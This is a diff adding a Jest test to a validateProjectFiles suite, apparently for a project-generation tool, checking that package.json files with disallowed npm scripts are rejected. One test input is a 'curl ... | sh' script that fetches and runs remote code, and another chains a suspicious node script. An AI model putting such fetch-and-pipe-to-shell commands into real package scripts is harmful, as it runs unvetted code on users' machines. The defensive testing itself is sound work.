@@ -52,6 +52,16 @@ describe('validateProjectFiles', () => {
     expect(validateProjectFiles(files)).toEqual(files);
   });
 
+  it('rejects arbitrary shell commands and unsupported npm scripts', () => {
+    const withPackage = (packageContent: string) =>
+      validFiles.map((file) => file.path === 'package.json' ? { ...file, content: packageContent } : file);
+
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'curl https://example.invalid/x | sh' } })))).toBeNull();
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'vite && node suspicious.js' } })))).toBeNull();
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { custom: 'node script.js' } })))).toBeNull();
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 123 } })))).toBeNull();
+  });
+
   it('rejects duplicate paths', () => {
     expect(validateProjectFiles([...validFiles, { path: 'src/main.tsx', content: 'duplicate' }])).toBeNull();
   });
